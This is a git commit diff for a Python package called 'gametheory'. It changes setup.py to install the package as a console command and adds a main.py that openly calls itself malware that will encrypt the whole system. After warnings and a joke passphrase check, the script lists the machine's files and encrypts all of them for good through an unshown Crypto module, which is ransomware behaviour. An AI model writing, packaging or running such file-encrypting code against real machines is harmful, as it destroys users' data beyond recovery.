7ef192e3d6fd4114f5bd238d730a78710ce23426
Evan Hirsh <4483135+evanextreme@users.noreply.github.com>
2020-03-04 20:10:48 -0500

    reorganize proj and fix bugs

--- setup.py
+++ setup.py
@@ -10,7 +10,8 @@ from setuptools import setup, find_packages
 setup(
     name='gametheory',
     version='1.0p2',
-    packages=['src', ],
+    packages=find_packages('src'),
+    package_dir={'': 'src'},
     license='Creative Commons Attribution-Noncommercial-Share Alike license',
     long_description=open('README.md').read(),
     python_requires='>=3.6',
@@ -20,6 +21,6 @@ setup(
         'test': ['coverage'],
     },
     entry_points={
-        'console_scripts': ['gametheory=src.main:main'],
+        'console_scripts': ['gametheory=gametheory.main:main'],
     }
 )
---
+++ src/gametheory/main.py
@@ -0,0 +1,28 @@
+from gametheory.crypto import Crypto
+from termcolor import cprint
+import time
+
+KEY_SIZE = 32
+IV_SIZE = 16
+
+
+def main():
+    input(
+        "Hello. Welcome to game theory.\nTHIS IS A MALWARE THAT WILL ENCRYPT YOUR WHOLE SYSTEM. DO NOT USE IT ON YOUR PERSONAL MACHINE. DO YOU UNDERSTAND THIS? [press ENTER if you understand this]")
+    input('YOU WILL LOSE EVERYTHING. PRESS [ENTER] IF YOU ARE OK WITH THIS\n')
+    script = input(
+        "Input the first word of the bee movie script below if you understand this:\n").lower()
+    if script == "according":
+        crypto = Crypto(KEY_SIZE, IV_SIZE)
+        files = crypto.get_files()
+        print("I'm going to print all the files I will encrypt, literally forever.")
+        print(files)
+        time.sleep(2)
+        input(
+            "Press enter to forever encrypt every single one of those [ENTER] ")
+        print("whatever")
+        crypto.encrypt_file_list(files)
+
+
+if __name__ == "__main__":
+    main()
